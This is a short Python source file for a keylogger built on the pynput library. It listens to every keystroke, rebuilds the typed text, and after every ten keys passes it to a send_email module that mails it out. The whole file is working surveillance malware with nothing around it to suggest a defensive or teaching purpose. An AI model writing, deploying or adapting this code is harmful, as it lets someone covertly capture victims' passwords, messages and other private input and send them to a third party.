from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def on_press(key):
    global keys, count
    print(f"{key} pressed")
    keys.append(key)
    count += 1
    if count >= 10:
        email(keys)
        keys.clear()
        count = 0

def email(keys):
    temp = []
    for key in keys:
        if hasattr(key, 'char') and key.char:
            temp.append(key.char)
        elif key == Key.space:
            temp.append(' ')
        elif key == Key.backspace:
            if temp:
                temp.pop()
    message = ''.join(temp)
    print("Sending:", message)
    send_email.sendemail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
